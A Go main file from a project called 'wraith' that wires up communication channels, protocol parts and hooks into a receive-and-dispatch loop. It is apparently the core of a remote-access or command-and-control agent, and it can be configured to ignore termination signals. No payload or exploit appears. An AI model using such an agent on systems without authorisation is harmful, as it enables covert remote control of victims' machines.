package main

import (
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/0x1a8510f2/wraith/comms"
	"github.com/0x1a8510f2/wraith/config"
	"github.com/0x1a8510f2/wraith/hooks"

	_ "github.com/0x1a8510f2/wraith/comms/channels/rx"
	_ "github.com/0x1a8510f2/wraith/comms/channels/tx"

	_ "github.com/0x1a8510f2/wraith/proto"
	_ "github.com/0x1a8510f2/wraith/proto/parts"
)

// Useful globals
var startTime time.Time

// Exit handling
var exitTrigger chan struct{}

func setupCloseHandler() {
	c := make(chan os.Signal)
	signal.Notify(
		c,
		syscall.SIGHUP,
		syscall.SIGINT,
		syscall.SIGQUIT,
		syscall.SIGTERM,
	)
	go func() {
		<-c
		if config.Config.Process.RespectExitSignals {
			exitTrigger <- struct{}{}
		}
	}()
}

func init() {
	startTime = time.Now()
	exitTrigger = make(chan struct{})
	setupCloseHandler()
}

func main() {
	// Run OnStart hooks
	hooks.RunOnStart()

	// Run OnExit hooks always on exit
	defer hooks.RunOnExit()

	// Mainloop: Transmit, receive and process stuff
	for {
		// TODO: Find what is concurrent and what is not to catch points where Wraith can break/stall
		select {
		case rx := <-comms.UnifiedRxQueue:
			// When data is received, run the OnRx handlers
			hooks.RunOnRx(rx.Data)
		case <-exitTrigger:
			return
		}
	}

}
